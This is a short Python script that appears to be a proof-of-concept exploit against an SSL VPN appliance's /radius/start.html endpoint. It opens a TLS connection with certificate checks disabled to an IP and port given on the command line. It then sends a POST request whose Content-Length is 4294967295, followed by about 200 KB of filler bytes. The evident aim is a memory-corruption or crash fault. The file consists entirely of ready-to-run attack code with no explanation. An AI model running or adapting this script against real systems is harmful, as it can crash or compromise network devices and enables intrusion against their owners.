import sys
import socket
import ssl


def get_data():
    payload = b"a" * 0x3000
    payload += b"b" * 0x30000
    return payload


def start(ip, port):
    try:
        data = b"""POST /radius/start.html HTTP/1.1\r
Host: 127.0.0.1\r
Content-Length: 4294967295\r
Content-Type: application/x-www-form-urlencoded\r
User-Agent: Mozilla/5.0\r
Accept-Encoding: gzip, deflate\r
Connection: close\r
\r
"""
        data += get_data()

        _socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        _socket.connect((ip, int(port)))
        _default_context = ssl._create_unverified_context()
        _default_context.set_ciphers("DEFAULT:@SECLEVEL=1:HIGH:!DH:!aNULL")
        _socket = _default_context.wrap_socket(_socket)
        _socket.sendall(data)
    except Exception as e:
        print(e)


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 %s <ip> <port>" % sys.argv[0])
        exit(1)

    start(sys.argv[1], sys.argv[2])